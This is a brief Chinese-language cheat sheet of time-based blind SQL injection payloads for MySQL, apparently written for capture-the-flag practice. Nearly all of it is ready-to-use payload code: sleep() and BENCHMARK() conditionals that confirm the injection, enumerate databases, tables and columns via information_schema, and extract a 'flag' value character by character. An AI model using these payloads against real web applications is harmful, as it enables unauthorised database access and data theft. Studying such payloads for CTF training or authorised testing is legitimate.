

# sleep盲注

# 1.确定语句

```javascript
and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+
```



# 2.爆库语句

```javascript
if((substr((select group_concat(schema_name) from information_schema.schemata
limit 0,1),NUM/*第几个*/,1)=ASCII/*需要匹配子的ascii*/),sleep(3),0)--+"
```





# 3.爆表语句

```javascript
if((substr((select group_concat(table_name) from information_schema.tables
where table_schema=DATA_NAME/*库名*/
limit 0,1),NUM/*第几个*/,1)=ASCII/*需要匹配子的ascii*/),sleep(3),0)--+"
```





# 4.爆字段语句

```javascript
if((substr((select group_concat(column_name) from information_schema.columns
where table_schema=DATA_NAME/*库名*/ and table_name=TABLE_NAME/*表名*/
limit 0,1),NUM/*第几个*/,1)=ASCII/*需要匹配子的ascii*/),sleep(3),0)--+"
```



# 5.爆内容

```javascript
if((substr((select flag/*所要报字段名*/ from flags.flag/*数据库中的表*/
limit 0,1),NUM/*第几个*/,1)=ASCII/*需要匹配子的ascii*/),sleep(3),0)--+"
```



# benchmark盲注

爆库语句

```javascript
UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),
BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM 
(select database() as current) as tb1--+
```

